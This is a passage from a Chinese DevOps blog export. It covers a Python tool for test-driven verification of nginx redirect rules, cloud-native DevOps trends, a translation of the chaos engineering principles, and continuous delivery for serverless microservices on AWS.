通过重定向的方式到新的产品中，因为有很多的第三方链接和搜索引擎依然保留了原系统中的链接。\n初步统计了一下，将近有3000多个 URL 需要重定向，光是规则和正则表达式就写了 400 多条（没有统一模式的 URL 害死人啊），这就引发了一个问题：我该如何验证这些规则和覆盖这些 URL ？此外，大量的重定向不光对用户来讲不是很好的体验，如果我要优化这些规则，我如何保证我当前的转发规则不被破坏？\n解决方案 #最早，我们写了一个 Shell 脚本，用 curl命令来验证这些 URL，最初只需要验证 200 条就可以满足需求，时间也不到两分钟。后来，我们采用了一个 Excel 文件来跟踪这些 URL，产品经理只需要把新的重定向 URL 补充到上面，我们就依据这些 URL 来开发 nginx 的重定向规则。\n这让我想到了 TDD：先写出一个自动化测试用例，然后修复这个自动化测试用例。更好的是，有了自动化的测试做保护，你可以放心和安全的对代码进行重构。\n此外，随着更多的 URL 需要重定向，这个数字在不断的增加。原先的 Shell 脚本执行的时间也从最初的 2 分钟增长到了15分钟。\n现有的工具满足不了要求，一怒之下，我决定开发一个自己的工具。它必须具备以下特点：\n可以通过文件读取规则，进行大批量验证。 多线程并发执行，可以提升效率。 很容易和 CI 集成。 能帮我做一定程度的重定向优化分析。 于是，我在一个周末的时间用 Python 写下了 vivian： 一个多线程的批量自动化重定向验证工具。\n它把原先的 15 分钟的验证时间缩短到了 17 秒，效率提升了 5294 % !!\n此外，我把测试用例集成到了代码库里。并把 vivian 提交到了 pipy，这样我就可以通过 pip 在初始化 CI 上安装了。也无需增加到代码库里变成一个需要维护的代码脚本。\n选择 Python 的原因主要是因为相较于 Ruby, Go, Java, NodeJS 来说。Python 的语言环境比较稳定，几乎每种 Linux 都包含 Python 的运行环境，且容易安装和集成。\n安装使用 Vivian #安装\n1 pip install vivian 使用\n1 vivian -f example.csv test.csv 非常简单，第一列是源 URL，第二列是目标 URL。例如：\nhttp://www.github.com, https://github.com/ http://www.facebook.com, https://facebook.com/ 采用 csv 文件的目的主要是方便使用 Excel 和文本工具编辑。\n之后会得出下列结果：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 vivian -f example.csv load test case from example.csv 2 cases loaded running in 2 threads verifying http://www.github.com to https://github.com/ verifying http://www.facebook.com to https://facebook.com/ Failed cases: ============================================================ line: 2 origin: http://www.facebook.com dist: https://www.facebook.com/ expect: https://facebook.com/ status: 200 redirect_count:1 ------------------------------------------------------------ 1/2 PASS in 5.8494720458984375 seconds 第一行输出提示测试用例文件位置。\n第二行输出提示测试用例数量和线程数量。你也可以通过增加 -n 来指定线程的数量，默认线程数量等于 CSV 文件记录行数。\n第三行到第四行列出了需要验证的 URL。\n第五行开始就是失败的测试用例信息：\n失败用例的第一行就是测试用例所在的文件行号。\n失败用例的第二行是测试用例测试的源 URL。\n失败用例的第三行是访问测试的 URL 的实际目标 URL。\n失败用例的第四行是期望得到的 URL。\n失败用例的第五行是访问测试用例源 URL 最后得到的 HTTP 状态。\n失败用例的第六行是访问测试用例源 URL 到最后结果之间的 重定向次数，有了这个数字我们可以优化 URL。\n最后一行表明有多少个用例通过了测试，同时统计了完成这些测试的总时间。\n最佳实践 #以下是我总结的使用 vivian 的最佳实践场景，希望能对你的 web 服务器维护工作起到帮助。\n采用 Excel 生成测试用例 #Excel，包括 Google Sheet。都是很方便的进行团队交流用的数据文件。对于很多开发和运维工程师来说，如果手动编写测试用例肯定是很费工夫的事情。所以，你只需要创建一个两列的 Excel 文件，分别存储源 URL 和目标 URL。之后你就可以采用 Excel 便捷的复制功能和计算功能生成很多的测试用例。\n不过，需要注意的是，你需要将 Excel 文件保存为 CSV 格式，才可以识别哦。\n采用 TDD 开发 nginx 规则 #当有了一个自动化的测试工具，我们就可以构建测试驱动开发实践。下面我举个例子演示一下：\n首先，我希望我的 nginx 配置可以帮我把所有请求通过 301 永久重定向转发到我的博客 http://wizardbyron.github.io 上去。\n首先，我需要创建一个虚拟域名，例如：local.testhost.com\n为了方便起见，我修改了我本地的 hosts 文件。加入如下一行：\nlocal.testhost.com 127.0.0.1 因此，我需要写一个测试用例文件 redirect_case.csv ：\nhttp://local.testhost.com, https://wizardbyron.github.io 当然，你也可以采用你的测试环境。\n接下来，我可以采用 vivian 来进行测试：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 vivian -f redirect_case.csv load test case from redirect_case.csv 1 cases loaded running in 1 processs verifying http://local.testhost.com to https://wizardbyron.github.io Failed cases: ============================================================ line: 1 origin: http://local.testhost.com dist: expect: https://wizardbyron.github.io status: redirect_count:0 ------------------------------------------------------------ ============================================================ 我们发现，测试失败，因为我们并没有启动任何一个 http 服务器。接下来，我们可以通过 docker 来启动一个 nginx 服务器：\n1 docker run --name nginx -d -p 80:80 nginx 记得要把 80 端口映射出来。接下来我们再次进行测试：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 vivian -f redirect_case.csv load test case from redirect_case.csv 1 cases loaded running in 1 processs verifying http://local.testhost.com to https://wizardbyron.github.io Failed cases: ============================================================ line: 1 origin: http://local.testhost.com dist: http://local.testhost.com expect: https://wizardbyron.github.io status: 200 redirect_count:0 ------------------------------------------------------------ ============================================================ 通过这次测试，我们发现虽然有了 nginx 服务器，但是我们的结果不正确。这时候，我们可以把 nginx 的配置文件从 nginx 容器里面复制出来：\n1 docker cp nginx:/etc/nginx/nginx.conf . 然后修改配置文件为如下所示：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 user nginx; worker_processes 1; error_log /var/log/nginx/error.log warn; pid /var/run/nginx.pid; events { worker_connections 1024; } http { include /etc/nginx/mime.types; default_type application/octet-stream; log_format main \u0026#39;$remote_addr - $remote_user [$time_local] \u0026#34;$request\u0026#34; \u0026#39; \u0026#39;$status $body_bytes_sent \u0026#34;$http_referer\u0026#34; \u0026#39; \u0026#39;\u0026#34;$http_user_agent\u0026#34; \u0026#34;$http_x_forwarded_for\u0026#34;\u0026#39;; access_log /var/log/nginx/access.log main; sendfile on; #tcp_nopush on; keepalive_timeout 65; #gzip on; include /etc/nginx/conf.d/*.conf; # 增加 server 的配置 server { listen 80 default_server; listen [::]:80 default_server; location / { return 301 https://wizardbyron.github.io; } } } 然后，我们把这个配置文件挂载到 nginx 容器中，取代默认的 配置文件。然后重新运行 nginx 容器：\n1 docker run --name nginx -d -v $(pwd)/nginx.conf:/etc/nginx/nginx.conf -p 80:80 nginx 然后我们再执行测试：\n1 2 3 4 5 6 7 8 9 vivian -f redirect_case.csv load test case from redirect_case.csv 1 cases loaded running in 1 processs verifying http://local.testhost.com to https://wizardbyron.github.io Failed cases: ============================================================ No failed case. ============================================================ 1/1 PASS in 0.9458322525024414 seconds 测试通过！\n用 TDD 的方式重构 nginx 转发规则 #如果可以做 TDD ，那么我们还可以对 Nginx 规则重构，采用正则表达式来精简配置文件。例如，我们有两个 nginx 规则：\n1 2 3 4 5 6 7 location = /path_to_site_a { return 301 https://wizardbyron.github.io; } location = /path_to_site_b { return 301 https://wizardbyron.github.io; } 然后我们用 docker 启动 nginx，加载我们最新的配置文件。\n接下来，我们可以编写两个测试用例：\nhttp://local.testhost.com/path_to_site_a, https://wizardbyron.github.io http://local.testhost.com/path_to_site_b, https://wizardbyron.github.io 它默认应该是通过的：\n1 2 3 4 5 6 7 8 9 10 vivian -f redirect_case.csv load test case from redirect_case.csv 2 cases loaded running in 2 processs verifying http://local.testhost.com/path_to_site_a to https://wizardbyron.github.io verifying http://local.testhost.com/path_to_site_b to https://wizardbyron.github.io Failed cases: ============================================================ No failed case. ============================================================ 2/2 PASS in 1.1543898582458496 seconds 然后，我们可以修改 nginx 配置文件为:\n1 2 3 location ~ /path_to_site_(a|b) { return 301 https://wizardbyron.github.io; } 它仍然应该是通过的：\n1 2 3 4 5 6 7 8 9 10 vivian -f redirect_case.csv load test case from redirect_case.csv 2 cases loaded running in 2 processs verifying http://local.testhost.com/path_to_site_a to https://wizardbyron.github.io verifying http://local.testhost.com/path_to_site_b to https://wizardbyron.github.io Failed cases: ============================================================ No failed case. ============================================================ 2/2 PASS in 1.1543898582458496 seconds 如果失败了，就要重新修改你的 nginx 转发规则。比如，我们在测试用例中增加一行：\nhttp://local.testhost.com/path_to_site_c, https://stackoverflow.com 以上的配置文件就会失败：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 vivian -f redirect_case.csv load test case from redirect_case.csv 3 cases loaded running in 3 processs verifying http://local.testhost.com/path_to_site_a to https://wizardbyron.github.io verifying http://local.testhost.com/path_to_site_b to https://wizardbyron.github.io verifying http://local.testhost.com/path_to_site_c to https://stackoverflow.com Failed cases: ============================================================ line: 3 origin: http://local.testhost.com/path_to_site_c dist: http://local.testhost.com/path_to_site_c expect: https://stackoverflow.com status: 404 redirect_count:0 ------------------------------------------------------------ ============================================================ 2/3 PASS in 0.8479752540588379 seconds 在这种模式下，你需要先把需要重定向的测试案例写到文件里，这时候运行 vivian 肯定会成功。之后你就可以优化合并一些正则表达式。由于有了 vivian 结合 docker 这种自动化测试的快速反馈机制。你可以很方便的优化你的 nginx 配置文件，无需部署之后再登录到主机上修改。\n作为冒烟/回归测试集成在持续部署流水线里 #我们有了自动化的测试工具，我们就可以把 nginx 配置和 测试用例文件保存到代码库里。在自己的 CI 服务器上安装 vivian，Vivian 需要你安装了 python3 和 pip，这对很多 Linux 发行版都不是一件困难的事情。\n安装完成后，你可以在部署完成后用 vivian 检测测试用例当做冒烟测试来检测 nginx 是否配置得当。如果存在失败的 URL，则会以错误退出，你的流水线就会告诉你这个版本还不适合发布。如果你需要不断的修改和优化 nginx 配置文件，这些测试用例就可以作为回归测试，来避免你的修改影响到现有生产环境的配置。\n一起来改进 Vivian #用 Dev 的方式处理 Ops 的工作，也算一种 DevOps 吧！？\n如果你对该工具感兴趣或者发现问题，请不要犹豫直接 Issue 或者 PR：https://github.com/wizardbyron/vivian\n","date":"June 12, 2018","permalink":"/blog/2018/2018-06-12-tdd-in-nginx/","section":"Blogs","summary":"","title":"测试驱动开发 Nginx 配置"},{"content":"回头遥望，DevOps 将迎来自己的十岁生日。对于整个行业，这十年 DevOps给 IT 行业所带来的冲击并没有因为时间的增长而放慢革新的脚步，反而越发的剧烈和深远。\n随着大规模的互联网应用不断在云计算平台上遇到挑战，新的应用架构模式呼之欲出，在众多的实践和方法论中，CloudNative 应用则是其中的佼佼者。 CloudNative 应用结合了 DevOps 社区在互联网上的最佳实践。\n然而，仅仅有了构建 CloudNative 应用的方法论是不够的。一方面，没有采用 DevOps 从组织和流程的角度优化企业的流程，仍然会出现 “DevOps 之痛”，并阻碍着互联网转型。另一方面，“经典的”企业级 DevOps 同样面临着 CloudNative 带来的新挑战。于是我们可以看到，很多具有 DevOps 基因的互联网企业开始刻意的进行敏捷和 DevOps 转型。而率先完成 敏捷和 DevOps 的企业在进行 云原生 应用改造和技术革新上带来了新的问题。\n这就对 DevOps 在云原生的环境下提出了新的课题和实践诉求，我们如何在云原生的环境下实践 DevOps 以达到更有生产力的表现？\n本文将从最新一期的技术雷达中，试图勾画出 DevOps 在云原生的环境下的特性、未来的趋势以及相应的实践。\n背景：不断蔓延的云环境复杂性 #本期技术雷达主题之一是：不断蔓延的云环境复杂性。\n随着更多的云计算厂商的诞生，差异性质的服务将会越来越少。而在马太效应下，云计算平台之间也将迎来大规模的整合和重组。云计算平台之间竞争不断加剧，使得我们对云计算有了更多的选择，然而带来的是云平台之间在兼容性上的问题。我们虽然可以看到 Docker 这样的封装式解决方案，但对于整体云计算平台的编排和利用。例如网络，安全设施，服务资源间调度，却统一规范和标准。从平台的角度来看，这确实是避免客户流失的有效手段。但留给用户的选择空间不大。\n因此，跨云平台的基础设施编排工具不断出现，使得用户可以在不同的云平台之间无缝切换。随之而来的将是一个云计算的标准或者事实标准将呼之欲出，加强这个市场上的马太效应，淘汰掉小的云服务厂商，或者因为技术独特而被大的厂商收购。\n如果你害怕自己的数据中心被平台所绑定，则需要花费更多的成本来维护一个云平台之间兼容性的应用系统。\nSecDevOps #本期技术雷达的另一个主题之一是：信任但要验证。\n相对于企业级的可控网络和访问结点来说，在云原生的环境下，企业所面临的挑战则更为艰巨。这就好比你之前在自己小区的花丛里种花，你所面对的无非家猫家狗和小孩子的破坏。然后，你现在要在野生山林里种花，就要面对更加未知和复杂的环境。\n然而，适应了企业级的应用开发和维护的开发团队并不如天生的互联网企业那般很快就能适应互联网的大丛林。\n在 DevOps 运动刚开始的时候，安全并不是一个主要的 Topic，只是一系列需要注意的事项，于是在做 DevOps 实践的时候，把安全放在了最后考虑，即 DevOpsSec。随着 DevOps 的实践越来越激进，新的工具不断从社区涌现。安全作为 DevOps 的阻力则越来越大。但安全始终是绕不开的重要事情。因此，DevOps 社区尝试用同样的办法炮制和安全部门的合作以及安全实践，随后有了 DevSecOps，Sec 逐渐成为了 DevOps 实践中重要的一环。\n就像我们之前讲的，面对复杂多变的云环境，安全要作为第一考量首先考量，而不是事后弥补。这一点就和我们在持续交付中探讨的“质量內建”一样。在云平台上实践 DevOps 要做到“安全內建”（Build Security In），这不单单是说我们增加几个自动化安全扫描的工具就足够的。要从系统的角度来重新思考安全在整个应用生命周期和团队的实践。ThoughtWorks 的安全社区在\u0026quot;安全內建\u0026quot;总结出了自己的实践，详细内容可以参考 buildsecurityin 网站。\n在上一期的技术雷达上，我们提到了混沌工程，混沌工程是在分布式系统上进行实验的学科, 目的是建立对系统抵御生产环境中失控条件的能力以及信心。在此基础上，本期技术雷达即将提到“安全混沌工程”，安全混沌工程 将扩展了安全技术的范畴：将误报引入到生产环境网络和其他基础设施 - 例如，构建时的依赖关系中。 检查是否有能力在受控条件下识别安全故障。但在初期阶段，应谨慎使用此技术, 避免团队遇到安全问题。\n另一方面，云平台服务商自己也推出了安全审计工具。Scout2 就是在 AWS 上的一款安全审计工具，可以自动帮你收集 AWS 上的配置数据以用于审计，它甚至可以帮助你生成攻击面报告。\nService Over Tools #在企业级的 DevOps 实践中，技术实践的很大一部分内容都是引入先进的管理工具的理念。例如引入持续交付服务器，代码管理服务器，自动化测试套件等等…… 引入的工具在提高团队生产力和敏捷性的同时，也给团队带来了新的挑战：由于每家企业的组织结构和流程不同，加之团队的工程实践能力参差不齐。就导致了很多实践并没有很好的落地执行，企业自身都需要对 DevOps 引入的技术实践进一步消化。\n但在云原生的场景下，我们无需去构造工具链，因为工具链本身是为最佳实践服务的。我们只需要根据自己的实践选择对应的服务就可以了，不光包含云平台自身的，也包括外部的。\n例如，你的应用可能会用到 MySQL 数据库 或者 ElasticSearch 搜索引擎。在云上环境，你无需初始化虚拟机，安装对应的软件包，进行配置。而是直接采用云平台上提供的服务，例如 AWS 上的 RDS 服务和 ElasticSearch 服务。云平台本身已经将高可用、高稳定性和最佳实践整合在其内部，只需要很少的人力和费用就可以完成过去很麻烦的事情。\n又例如，日志收集和监控，我们也不再需要搭建 Nagios 和 Zabbix 这样的工具。只需要 NewRelic 这样的在线服务就可以完成很方便的监控集成。\n当我们开始向云上迁移的时候，首先可能把云平台当做一个远程的机房，让应用能够在云平台上运行起来，并在迁移过程中偿还一部分技术债。然后再考虑如何利用云平台的服务替换原有的业务。这往往是一件劳师动众的浩大工程。好在各云平台也提供了相应的简化方式。例如即将出现在最新一期的技术雷达的 Azure Service Fabric 和 Google 推出的 GKE。前者提供了一个 PaaS 平台，而后者则把 Kubernates 服务化，变成其所在平台的一等公民，大大降低了搭建和维护成本。而随着 Kubernates 的普及，越来越多的云厂商会将纳入自己产品服务目\u0010录的一部分，但 Kubernates 的迁移仍然是有门槛的，你不得不面对复杂的应用依赖关系情况。而即将出现在最新一期技术雷达中的 Helm 就是这方面的工具， Helm 是 Kubernetes的包管理器，它的依赖管理，模板和钩子机制极大地简化了Kubernetes中的应用程序生命周期管理。让你更容易将应用部署到云计算平台上。\n类似的工具还有很多很多。所以，当我们开始在云上构建起自己的数据中心的时候，我们首先需要考虑的是有没有合适的应用服务，而不是自己费精力去构建一套工具。\n即便如此，这也不是在所有的场景下都适用，我们还是要权衡众多因素做出判断。不过就我个人的经验来说，经过实践考验的第三方服务永远是首选。\n还有一点不得不说的就是安全性的问题，除了上文提到的基础设施安全，我们还要注意应用的安全。Hosted identity management as a service （托管的身份验证服务）也是即将发布的技术雷达中的一个条目。身份验证是很多应用程序的“公用组件”，几乎每个企业级应用程序都会开发一套自己的身份验证服务。在云原生的环境下，未经考验和测试的身份认证反倒是成为了一个重大的安全隐患。因此，我推荐你采用注入 Auth0 这样的统一认证方案来增强你的应用的安全性。\n在云原生的场景下，全球的竞争加速了技术实践的淘汰，有生命力的工具和服务在市场上生存了下来。并和它们所服务的客户一起创造了更加有生命力的技术实践。未来会出现更多的公司，将开源工具的最佳实践包装为一个 SaaS 化服务，并更好的和云平台集成。在国内，我们可以看到越来越多的创业企业从这个角度出发，推出了相关方面的产品。这也是未来小规模高增长的技术型互联网企业的创业方向。\nServerless 应用优先 #在 DevOps 实践中，基础设施即代码技术无疑是最令人着迷的实践之一。最早出现的 Puppet 和 Chef 这样的配置管理工具，在很大程度上降低了管理大量基础设施设备的成本。但随着 PaaS 服务逐渐在云计算平台上占据主流，IaaS 服务高昂的管理成本也让相应的工具日渐式微。基础设施的服务化以及应用的轻量化，使得基础设施即代码更多情况下变成了一个配置管理的工作。\n而 Serverless 应用的横空出现，则是让基础设施的管理工作进入了一个新的阶段：基础设施的管理只剩下对基础设施行为的描述，而所有的描述则由配置和代码来实现。\n这里的 Serverless 应用不光指的是 FaaS （函数即服务），也讲的是 BaaS（后台应用即服务）。Serverless 技术让我们进一步降低了应用程序执行的门槛。一方面通过标准化的 API 提供基础设施服务，另一方面通过低差异的运行时环境构建出简单的应用程序。两方面的结合构造除了稳定且简单的应用。不光降低了 DevOps 的门槛，也降低了开发人员和维护人员的门槛。\n对于即将到来的 CloudNative Developer（云原生开发者），他们不再自己的电脑上的 IDE 中开发应用。而是在线通过浏览器提供的 IDE 开发应用，并遵从云平台提供的各种优秀技术实现。开发者之间的差异性和个性化被进一步降低，带来的是更加可控并且一致的应用行为，高品质的应用和高度提升的开发效率。\n当我们考虑向云上迁移应用的时候，某些小组件和工具是否可以写成 Serverless 的应用以降低迁移带来的复杂度和基础设施稳定性挑战。\nOps as infrastructure developers #运维工程师成为基础设施开发者这并不是一个新的趋势，当 Puppet 开启了基础设施即代码的大门之后。我们发现越来越多的运维工程师成为了 Ruby 开发者。随着 Python 在众多运维工具和平台上扮演者越来越重要的角色，更多的运维工程师也成为了 Python 开发者。而和很多的 Python 开发者不同，运维工程师所面向的领域不是 Web 也不是 人工智能，而是基础设施。于是，就有了 “基础设施开发者”这一说法。\n而在云原生的背景下，这个趋势得到了显著的加强。随着各种可编程基础设施和 PaaS 平台对编程语言的支持。基础设施和第三方服务的界限越来越模糊，这给了开发者更加友好的体验。在即将发布的技术雷达中简要介绍了troposphere 这个 Python 库，它用于取代 Terraform 来对 AWS 基础设施进行编程。这样我们可以利用语言本身的机制处理基础设施开发中的问题。\nCloudNative DevOps 会不会导致 DevOps 的分离 #相对于基础设施的开发者而言，应用的开发者则被称作为 Application Developer。对于以往的 DevOps 痛点，主要是时间上水平的 Dev 和 Ops 的分离，以及职责的分离。它的问题来自于人为讲应用生命周期的各个部分划给了职责不同的各个部门。\n这对于应用的完整迭代生命周期来说是有害的，特别是在线产品。\n而随着基础设施的标准化和规范化，则会带来新的 DevOps 和分离。但这不是在应用程序生命周期上的分离，而是在应用程序不同职责间的分离。\n这是否意味着在一定程度上，Dev 和 Ops 从合作走向了分离？恰恰相反，由于新的技术和实践的引入，原有的 DevOps 团队重新因为实践的需要而重新划分成彼此职责清晰，相互独立而又配合默契的两个团队。应用开发团队完全承接了应用维护团队的全部职责成为一个完整的端到端产品团队。而运维团队也通过新的云计算技术和工具成为了基础设施端到端的产品团队。\n然而，缺乏有效的沟通机制和度量机制仍然是企业向“后 DevOps”时代过度的一大陷阱。这么做并不是要消灭沟通，而是在提升沟通的效率。\n所以，作为 CloudNative DevOps 的合作，更多的是强调团队面对不同人群的端到端全生命周期服务理念：运维团队服务开发团队，提供更加便捷稳定的基础设施。而开发团队服务于最终用户，提供更加具有价值的应用程序。\n而新的 DevOps 分离并不是 Dev 和 Ops 的沟通，是 Application Developer 和 Infrastructure Developer 的沟通，同样使开发人员之间的沟通。他们各自维护各自服务的生命周期，通过专业性提高效率并且通过统一的技术语言进行沟通。\n从另一个角度说，传统的 Ops 的定义将逐渐消失，新的 Ops 定义则会结出新的果实。在这个意义上，说 CloudNative DevOps 是对传统 Ops 的一记补刀也不为过。\n更多的技术雷达信息请关注 ThoughtWorks 官方微信。\n","date":"June 2, 2018","permalink":"/blog/2018/2018-06-02-cloudnative-devops/","section":"Blogs","summary":"","title":"云原生 DevOps"},{"content":"混沌工程是在分布式系统上进行实验的学科, 目的是建立对系统抵御生产环境中失控条件的能力以及信心。\n大规模分布式软件系统的发展正在改变软件工程。作为一个行业，我们很快采用了提高开发灵活性和部署速度的实践。紧跟着这些好处的一个紧迫问题是：我们对投入生产的复杂系统中有多少信心？\n即使分布式系统中的所有单个服务都正常运行, 这些服务之间的交互也会导致不可预知的结果。 这些不可预知的结果, 由影响生产环境的罕见但破坏性的真实事件复合而成，令这些分布式系统存在内在的混沌。\n我们需要在异常行为出现之前，在整个系统的范围内找出这些弱点。 系统弱点包括以下形式: 当服务不可用时的不正确回退设置;不当的超时设置导致的重试风暴;由于下游依赖项流量过载导致的服务中断;单点故障时的级联失败等。我们必须主动的发现这些重要的弱点，在这些弱点通过生产环境暴露给我们的客户之前。我们需要一种方法来管理这些系统固有的混沌, 通过增加的灵活性和速率以提升我们对生产环境部署的信心, 尽管系统的复杂性是由这些部署所导致的。\n基于经验和系统的方法解决了分布式系统在规模增大时引发的混乱问题, 并以此建立了对这些系统抵御现实条件的能力的信心。 我们通过在受控实验中观察分布式系统的行为来了解它的特性。 我们称之为混沌工程。\n混沌工程实践 #为了具体地解决分布式系统在规模上的不确定性，可以把混沌工程看作是为了揭示系统弱点而进行的实验。这些实验遵循四个步骤：\n首先，用系统在正常行为下的一些可测量的输出来定义“稳态”。 假设这个稳定状态在控制组和实验组都会继续存在。 引入反映真实世界事件的变量，如服务器崩溃、硬盘故障、网络连接断开等。 试图通过假设控制组和实验组之间的稳态差异来反驳这个假设。 破坏稳态的难度越大，我们对系统行为的信心就越强。如果发现了一个弱点，那么我们就有了一个改进目标。避免在系统规模化之后被放大。\n高级原则 #以下原则描述了应用混沌工程的理想方式，这些原则基于上述实验过程。 对这些原则的匹配程度能够增强我们在大规模分布式系统的信心。\n建立一个围绕稳定状态行为的假说 #要关注系统的可测量输出, 而不是系统的属性。 对这些输出在短时间内的度量构成了系统稳定状态的一个代理。 整个系统的吞吐量、错误率、延迟百分点等都可能是表示稳态行为的指标。 通过在实验中的系统性行为模式上的关注, 混沌工程验证了系统是否正常工作, 而不是试图验证它是如何工作的。\n多样化真实世界的事件 #混沌变量反映了现实世界中的事件。 我们可以通过潜在影响或估计频率排定这些事件的优先级。 考虑与硬件故障类似的事件, 如服务器宕机、软件故障 (如错误响应) 和非故障事件 (如流量激增或缩放事件)。 任何能够破坏稳态的事件都是混沌实验中的一个潜在变量。\n在生产环境中运行实验 #系统的行为会依据环境和流量模式都会有所不同。 由于资源使用率变化的随时可能发生, 因此通过采集实际流量是捕获请求路径的唯一可靠方法。 为了保证系统执行方式的真实性与当前部署系统的相关性, 混沌工程强烈推荐直接采用生产环境流量进行实验。\n持续自动化运行实验 #手动运行实验是劳动密集型的, 最终是不可持续的，所以我们要把实验自动化并持续运行。 混沌工程要在系统中构建自动化的编排和分析。\n最小化爆炸半径 #在生产中进行试验可能会造成不必要的客户投诉。虽然对一些短期负面影响必须有一个补偿, 但混沌工程师的责任和义务是确保这些后续影响最小化且被考虑到。\n混沌工程是一个强大的实践, 它已经在世界上一些规模最大的业务系统上改变了软件是如何设计和工程化的。 相较于其他方法解决了速度和灵活性, 混沌工程专门处理这些分布式系统中的系统不确定性。 混沌工程的原则为我们大规模的创新和给予客户他们应得的高质量的体验提供了信心。\n欢迎加入混沌社区的 Google 讨论组和我们一起讨论这些原则的应用。\n","date":"March 1, 2018","permalink":"/blog/2018/2018-03-01-principlesofchaos-zh-cn/","section":"Blogs","summary":"","title":"翻译-混沌工程的原则"},{"content":"","date":null,"permalink":"/tags/%E6%B7%B7%E6%B2%8C%E5%B7%A5%E7%A8%8B/","section":"Tags","summary":"","title":"混沌工程"},{"content":"“Serverless 风格微服务的持续交付（上）：架构案例”中，我们介绍了一个无服务器风格的微服务的架构案例。这个案例中混合了各种风格的微服务\n架构图如下：\n在这个架构中，我们采用了前后端分离的技术。我们把 HTML，JS， CSS 等静态内容部署在 S3 上，并通过 CloudFront 作为 CDN 构成了整个架构的前端部分。我们把 Amazon API Gateway 作为后端的整体接口连接后端的各种风格的微服务，无论是运行在 Lambda 上的函数，还是运行在 EC2 上的 Java 微服务，他们整体构成了这个应用的后端部分。\n从这个架构图上我们可以明显的看到 前端（Frontend）和后端（Backend）的区分。\n持续部署流水线的设计和实现 #任何 DevOps 部署流水线都可以分为三个阶段：待测试，待发布，已发布。\n由于我们的架构是前后端分离的，因此我们为前端和后端分别构造了两条流水线，使得前后端开发可以独立。如下图所示：\n在这种情况下，前端团队和后端团队是两个不同的团队，可以独立开发和部署，但在发布的时候则有些不同。由于用户是最后感知功能变化的。因此，为了避免界面报错找不到接口，在新增功能的场景下，后端先发布，前端后发布。在删除功能的场景下，前端先发布，后端后发布。\n我们采用 Jenkins 构建我们的流水线，Jenkins 中已经含有足够的 AWS 插件可以帮助我们完成整个端到端的持续交付流水线。\n前端流水线 #前端持续交付流水线如下所示：\n前端流水线的各步骤过程如下：\n我们采用 BDD/ATDD 的方式进行前端开发。用 NightWatch.JS 框架做 端到端的测试，mocha 和 chai 用于做某些逻辑的验证。 我们采用单代码库主干（develop 分支）进行开发，用 master 分支作为生产环境的部署。生产环境的发布则是通过 Pull Request 合并的。在合并前，我们会合并提交。 前端采用 Webpack 进行构建，形成前端的交付产物。在构建之前，先进行一次全局测试。 由于 S3 不光可以作为对象存储服务，也可以作为一个高可用、高性能而且成本低廉的静态 Web 服务器。所以我们的前端静态内容存储在 S3 上。每一次部署都会在 S3 上以 build 号形成一个新的目录，然后把 Webpack 构建出来的文件存储进去。 我们采用 Cloudfront 作为 CDN，这样可以和 S3 相互集成。只需要把 S3 作为 CDN 的源，在发布时修改对应发布的目录就可以了。 由于我们做到了前后端分离。因此前端的数据和业务请求会通过 Ajax 的方式请求后端的 Rest API，而这个 Rest API 是由 Amazon API Gateway 通过 Swagger 配置生成的。前端只需要知道 这个 API Gateway，而无需知道API Gateway 的对应实现。\n后端流水线 #后端持续交付流水线如下所示：\n后端流水线的各步骤过程如下：\n我们采用“消费者驱动的契约测试”进行开发，先根据前端的 API 调用构建出相应的 Swagger API 规范文件和示例数据。然后，把这个规范上传至 AWS API Gateway，AWS API Gateway 会根据这个文件生成对应的 REST API。前端的小伙伴就可以依据这个进行开发了。 之后我们再根据数据的规范和要求编写后端的 Lambda 函数。我们采用 NodeJS 作为 Lambda 函数的开发语言。并采用 Jest 作为 Lambda 的 TDD 测试框架。 和前端一样，对于后端我们也采用单代码库主干（develop 分支）进行开发，用 master 分支作为生产环境的部署。 由于 AWS Lambda 函数需要打包到 S3 上才能进行部署，所以我们先把对应的构建产物存储在 S3 上，然后再部署 Lambda 函数。 我们采用版本化 Lambda 部署，部署后 Lambda 函数不会覆盖已有的函数，而是生成新版本的函数。然后通过别名（Alias）区分不同前端所对应的函数版本。默认的 $LATEST，表示最新部署的函数。此外我们还创建了 Prod，PreProd, uat 三个别名，用于区分不同的环境。这三个别名分别指向函数某一个发布版本。例如：函数 func 我部署了4次，那么 func 就有 4个版本（从1开始）。然后，函数 func 的 $LATEST 别名指向 4 版本。别名 PreProd 和 UAT 指向 3 版本，别名 Prod 在 2 版本。 技术而 API 的部署则是修改 API Gateway 的配置，使其绑定到对应版本的函数上去。由于 API Gateway 支持多阶段（Stage）的配置，我们可以采用和别名匹配的阶段绑定不同的函数。 完成了 API Gateway 和 Lamdba 的绑定之后，还需要进行一轮端到端的测试以保证 API 输入输出正确。 测试完毕后，再修改 API Gateway 的生产环境配置就可以了。 部署的效果如下所示：\n无服务器微服务的持续交付新挑战 #在实现以上的持续交付流水线的时候，我们踩了很多坑。但经过我们的反思，我们发现是云计算颠覆了我们很多的认识，当云计算把某些成本降低到趋近于 0 时。我们发现了以下几个新的挑战：\n如果你要 Stub，有可能你走错了路。 测试金子塔的倒置。 你不再需要多个运行环境，你需要一个多阶段的生产环境 (Multi-Stage Production)。 函数的管理和 NanoService 反模式。 Stub ？别逗了 #很多开发者最初都想在本地建立一套开发环境。由于 AWS 多半是通过 API 或者 CloudFormation 操作，因此开发者在本地开发的时候对于AWS 的外部依赖进行打桩（Stub） 进行测试，例如集成DynamoDB（一种 NoSQL 数据库），当然你也可以运行本地版的 DynamoDB，但组织自动化测试的额外代价极高。然而随着微服务和函数规模的增加，这种管理打桩和构造打桩的虚拟云资源的代价会越来越大，但收效却没有提升。另一方面，往往需要修改几行代码立即生效的事情，却要执行很长时间的测试和部署流程，这个性价比并不是很高。\n这时我们意识到一件事：\n如果某一个环节代价过大，你需要思考一下这个环节存在的必要性。\n由于 AWS 提供了很好的配置隔离机制，于是为了得到更快速的反馈，我们放弃了 Stub 或构建本地 DynamoDB，而是直接部署在 AWS 上进行集成测试。只在本地执行单元测试，由于单元测试是 NodeJS 的函数，所以非常好测试。\n另外一方面，我们发现了一个有趣的事实，那就是：\n测试金子塔的倒置 #由于我们采用 ATDD 